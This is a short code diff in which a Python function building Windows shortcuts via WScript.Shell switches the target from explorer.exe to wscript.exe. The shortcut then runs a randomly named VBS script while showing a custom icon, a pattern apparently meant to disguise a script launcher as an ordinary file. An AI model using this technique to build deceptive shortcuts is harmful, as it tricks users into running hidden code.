@@ -52,7 +52,7 @@ def create_file_shortcut(file_path, name: str, icon_path: str, icon_index: int =
 
     shell = win32com.client.Dispatch("WScript.Shell")
     shortcut = shell.CreateShortCut(f"{working_folder}\\shortcut\\shortcut_{random_number}.lnk")
-    shortcut.TargetPath = "C:\\Windows\\explorer.exe"
+    shortcut.TargetPath = "C:\\Windows\\System32\\wscript.exe"
     shortcut.WorkingDirectory = (file_path + random_number_2).replace(file_name + random_number_2, "")
     shortcut.Arguments = f"\"{working_folder}\\shortcuts\\file_shortcut_{random_number}.vbs\""
     shortcut.IconLocation = f"{icon_path},{icon_index}"
